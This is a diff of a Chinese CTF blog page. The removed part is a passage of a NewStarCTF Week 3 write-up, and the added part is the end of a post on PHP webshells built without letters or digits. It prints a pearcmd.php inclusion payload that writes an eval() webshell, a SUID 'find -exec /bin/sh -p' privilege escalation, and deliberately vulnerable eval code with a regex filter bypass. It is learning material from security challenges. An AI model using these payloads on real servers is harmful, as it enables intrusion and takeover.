-<p>但是filter伪协议被过滤了，提示是要getshell</p>
-<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">Docker PHP裸文件本地包含综述</a></p>
-<p>这里是通过pearcmd.php来实现getshell的，使用burp进行抓包，参数改为<code>index.php?+config- create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=eval($_REQUEST[8])?&gt;+/tmp/monkey.php</code></p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-107.png"></p>
-<p>然后我们包含文件monkey.php，使用?file&#x3D;&#x2F;tmp&#x2F;monkey，发现包含成功</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-108.png"></p>
-<p>然后通过命令执行来得到flag</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-109.png"><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-110.png"></p>
-<h4 id="Maybe-You-Have-To-think-More"><a href="#Maybe-You-Have-To-think-More" class="headerlink" title="Maybe You Have To think More"></a>Maybe You Have To think More</h4><p>根据提示可以猜想是thinkPHP的反序列化，然后随便访问一个文件得到了thinkPHP的具体版本</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-111.png"></p>
-<p>先在主页面随便输入一个用户，发现会获取cookie值</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-112.png"></p>
-<p>通过解码发现是base64编码的值，而且是序列化的值</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-113.png"></p>
-<p>然后我们在网上找了一篇关于thinkPHP5.1序列化的文章，直接拿到poc<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/263977.html">https://www.freebuf.com/vuls/263977.</a><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/263977.html">html</a></p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-114.png"><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-115.png"><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-116.png"></p>
-<p>flag在环境变量里面</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-117.png"></p>
-<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h4 id="qsdz’s-girlfriend-3"><a href="#qsdz’s-girlfriend-3" class="headerlink" title="qsdz’s girlfriend 3"></a>qsdz’s girlfriend 3</h4><p>使用xshell连接，然后在用户目录发现了flag，查看发现了提示</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-118.png"></p>
-<p>在blog文件夹里面发现不要让密码相同的提示</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-119.png"></p>
-<p>在用户thai的用户目录发现hint，但是打不开，通过查看memo文件可以得到密码进而得到hint</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-120.png"><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-121.png"></p>
-<p>SUID，通过百度搜索发现这个可以提升权限，使用find . -exec &#x2F;bin&#x2F;sh -p ; -quit提升权限</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-122.png"></p>
-<p>使用ls查看girlfriends目录下的文件</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-123.png"><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-124.png"></p>
-<p>然后使用cat查看另外一个文件得到flag</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-125.png"></p>
-<h2 id="下面是复现的内容："><a href="#下面是复现的内容：" class="headerlink" title="下面是复现的内容："></a>下面是复现的内容：</h2><p>原文地址：<a target="_blank" rel="noopener" href="https://mochu.blog.csdn.net/article/details/127152796?spm=1001.2014.3001.5502">BUUCTF NewStarCTF 公开赛赛道Week3<br>Writeup</a></p>
-<h4 id="Whats-HTTP"><a href="#Whats-HTTP" class="headerlink" title="Whats HTTP"></a>Whats HTTP</h4><p>所有步骤都做了，但是没看文件里面的内容……</p>
-<p>先打开流量包，把HTTP对象都导出</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-126.png"></p>
-<p>文件按照文件的大小进行排序</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-127.png"></p>
-<p>打开sssssercet发现是一段base64编码的内容</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-128.png"><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-129.png"></p>
-<h4 id="WebShell！"><a href="#WebShell！" class="headerlink" title="WebShell！"></a><strong>WebShell！</strong></h4><p>这题说flag的形式是flag{webshell密码_黑客获取的用户名_机密文件的内容}</p>
-<p>Webshell的密码是最容易获取的（这个我也获取到了，哈哈哈哈）</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-130.png"></p>
-<p>接下来似乎好像就得看经验了，师傅说蚁剑的流量要看最长的那串base64解码就可以，并且一般是该参数两位之后的才是正确的命令的base64编码</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-131.png"></p>
-<p>这里是看那几个最长的里面，慢慢试出来的，最后得出的命令是whoami以及获取机密文件的命令。</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-132.png"></p>
-<p>然后这里的响应包都是gzip的形式</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-133.png"></p>
-<p>这里将其改为hex转储</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-134.png"></p>
-<p>将gzip格式的数据取出来</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-135.png"></p>
-<p>将获取的16进制数据放到winhex中，保存为whoami.txt.gz文件</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-136.png"><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-137.png"></p>
-<p>所以得到用户名是www-data，tcp.stream eq 38是获取机密文件的命令，同样的方法</p>
-<p><img src="/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK3-WP/image-138.png"></p>
-<p>最后flag为flag{n3wst4r_www-data_Y0UAr3G00D}</p>
-<p>得出结论：太难了，我不配作misc……</p>
-<p>这一周的解题都在这里了，还是比较废物。好好加油吧！</p>
+<p><img src="/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/image-156-1024x541.png"></p>
+<blockquote>
+<p>经过测试发现：对PHP版本有限制（这只是个人测试的，不代表最终效果）</p>
+<p>5.4.45&lt;&#x3D;PHP&lt;&#x3D;7.0.9</p>
+</blockquote>
+<h1 id="提高篇"><a href="#提高篇" class="headerlink" title="提高篇"></a>提高篇</h1><blockquote>
+<p>源码：</p>
+</blockquote>
+<pre><code>&lt;?php
+if (isset($_GET[&#39;code&#39;])) &#123;
+    $code = $_GET[&#39;code&#39;];
+    if (strlen($code) &gt; 35) &#123;
+        die(&quot;Long.&quot;);
+    &#125;
+    if (preg_match(&quot;/[A-Za-z0-9_$]+/&quot;, $code)) &#123;
+        die(&quot;NO.&quot;);
+    &#125;
+    eval($code);
+&#125; else &#123;
+    highlight_file(__FILE__);
+&#125;
+</code></pre>
+<h3 id="PHP7下绕过"><a href="#PHP7下绕过" class="headerlink" title="PHP7下绕过"></a>PHP7下绕过</h3><p>PHP7前是不允许用<code>($a)();</code>这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过<code>(&#39;phpinfo&#39;)();</code>来执行函数，第一个括号中可以是任意PHP表达式。所以我们构造一个phpinfo字符串即可。</p>
+<p><img src="/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-176-1024x459.png"></p>
+<h3 id="PHP5下绕过"><a href="#PHP5下绕过" class="headerlink" title="PHP5下绕过"></a>PHP5下绕过</h3><p>看的有点懵逼，有时间再看看，有兴趣的小伙伴可以去P神的原文看看，文章的顶部有链接，是我太菜了……</p>
+<p>再次感谢大佬的文章！</p>
 
       
     </div>
@@ -403,7 +531,7 @@
 
 
   <nav class="pagination">
-    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/26/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/26/">26</a><span class="page-number current">27</span><a class="page-number" href="/page/28/">28</a><span class="space">&hellip;</span><a class="page-number" href="/page/42/">42</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/28/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/26/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/26/">26</a><span class="page-number current">27</span><a class="page-number" href="/page/28/">28</a><span class="space">&hellip;</span><a class="page-number" href="/page/43/">43</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/28/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 </div>
@@ -427,7 +555,7 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">180k</span>
+    <span title="站点总字数">181k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
